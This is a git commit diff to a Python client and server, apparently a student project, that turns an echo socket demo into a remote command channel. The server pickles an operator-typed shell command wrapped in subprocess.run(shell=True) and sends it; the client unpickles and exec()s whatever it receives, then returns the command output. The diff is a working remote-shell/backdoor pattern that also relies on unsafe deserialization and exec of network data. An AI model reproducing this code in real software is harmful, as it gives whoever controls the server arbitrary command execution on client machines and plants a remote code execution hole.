0bc3a15fb32fab1d203980cb644c965404e8d1e5
ColbyRood <crood1@umbc.edu>
2023-12-03 15:16:24 -0500

    Executes user-specified shell commands

--- Client.py
+++ Client.py
@@ -1,40 +1,25 @@
 # echo-client.py
 
 import socket
+import pickle
+import subprocess
 
-responseDict = {}
-
-def execTesting():
+def pickleTesting():
+    newValue = None
     HOST = "127.0.0.1"  # The server's hostname or IP address
     PORT = 65432  # The port used by the server
 
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         s.connect((HOST, PORT))
         data = s.recv(1024000)
-        data = data.decode("utf-8")
-        exec(data, responseDict)
-        s.sendall(bytes(responseDict['response'], 'utf-8'))
+        deSerialized = pickle.loads(data)
+        exec(deSerialized)
+
+        reSerialized = pickle.dumps(newValue)
+        s.sendall(reSerialized)
         print("done")
 
-
-def helloWorld():
-    HOST = "127.0.0.1"  # The server's hostname or IP address
-    PORT = 65432  # The port used by the server
-
-    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-        
-        s.connect((HOST, PORT))
-        data = s.recv(1024000)
-        s.sendall(data)
-        print("done")
-        '''
-        s.connect((HOST, PORT))
-        s.sendall(b"Hello, world")
-        data = s.recv(1024)
-
-    print(f"Received {data!r}")
-    '''
-
+__name__ = "__main__"
 
 if __name__ == "__main__":
-    execTesting()
+    pickleTesting()
--- Server.py
+++ Server.py
@@ -1,51 +1,64 @@
+
 # echo-server.py
 
 import socket
 import pickle
 from abc import ABC, abstractmethod
 
-helloExec = """
-response = "hello world"
-"""
+ui_image = """888b     d888                   888    d8b              888b     d888                                         888               888          
+8888b   d8888                   888    Y8P              8888b   d8888                                         888               888          
+88888b.d88888                   888                     88888b.d88888                                         888               888          
+888Y88888P888 888  888 .d8888b  888888 888  .d8888b     888Y88888P888  8888b.  888d888 88888b.d88b.   8888b.  888  8888b.   .d88888  .d88b.  
+888 Y888P 888 888  888 88K      888    888 d88P"        888 Y888P 888     "88b 888P"   888 "888 "88b     "88b 888     "88b d88" 888 d8P  Y8b 
+888  Y8P  888 888  888 "Y8888b. 888    888 888          888  Y8P  888 .d888888 888     888  888  888 .d888888 888 .d888888 888  888 88888888 
+888   "   888 Y88b 888      X88 Y88b.  888 Y88b.        888   "   888 888  888 888     888  888  888 888  888 888 888  888 Y88b 888 Y8b.     
+888       888  "Y88888  88888P'  "Y888 888  "Y8888P     888       888 "Y888888 888     888  888  888 "Y888888 888 "Y888888  "Y88888  "Y8888  
+                   888                                                                                                                       
+              Y8b d88P                                                                                                                       
+               "Y88P"    """
 
+#Pickle Dictionary
+#class command(ABC):
+#     @abstractmethod
+#     def run(self):
+#         pass
 
-def execMainTesting():
+# class helloPickle(command):
+#     # Hellow world pickle
+#     def run(self):
+#         created_pickle = pickle.dumps("Hello pickle!")
+#         return created_pickle
+
+pickleCommand1 = """result = subprocess.run('"""
+
+pickleCommand2 = """', stdout=subprocess.PIPE, text=True, shell=True)
+newValue = result.stdout
+reSerialized = pickle.dumps(newValue)
+s.sendall(reSerialized)"""
+
+def pickleMainTesting():
     HOST = "127.0.0.1"  # Standard loopback interface address (localhost)
     PORT = 65432  # Port to listen on (non-privileged ports are > 1023)
+
 
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         s.bind((HOST, PORT))
         s.listen()
-        data = bytes(helloExec, 'utf-8')
-
+        userCommand = input(">> ")
+        data = pickle.dumps(pickleCommand1 + userCommand + pickleCommand2)
         conn, addr = s.accept()
         with conn:
-            conn.sendall(data)    
+            conn.sendall(data)
             print(f"Connected by {addr}")
-            while True:
-                recieved = conn.recv(1024000)
-                if not recieved:
-                    break
-                print(f"Received {recieved!r}")
+            recieved = conn.recv(1024000)
+            deSerialized = pickle.loads(recieved)
+            #if not recieved:
+            print(deSerialized)
 
-def helloWorldTesting():
-    HOST = "127.0.0.1"  # Standard loopback interface address (localhost)
-    PORT = 65432  # Port to listen on (non-privileged ports are > 1023)
 
-    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-        s.bind((HOST, PORT))
-        s.listen()
-        data = b"Hello World"
-        conn, addr = s.accept()
-        with conn:
-            conn.sendall(data)    
-            print(f"Connected by {addr}")
-            while True:
-                recieved = conn.recv(1024)
-                if not recieved:
-                    break
-                print(f"Received {recieved!r}")
-
+__name__ = "__main__"
 
 if __name__ == "__main__":
-    execMainTesting()
+    print(ui_image)
+    #userInput = input("\nSelect the action you wish to take:\n1. print \"hello pickle\" on client machine\n2. retrieve file names within client machine's current directory\n")
+    pickleMainTesting()
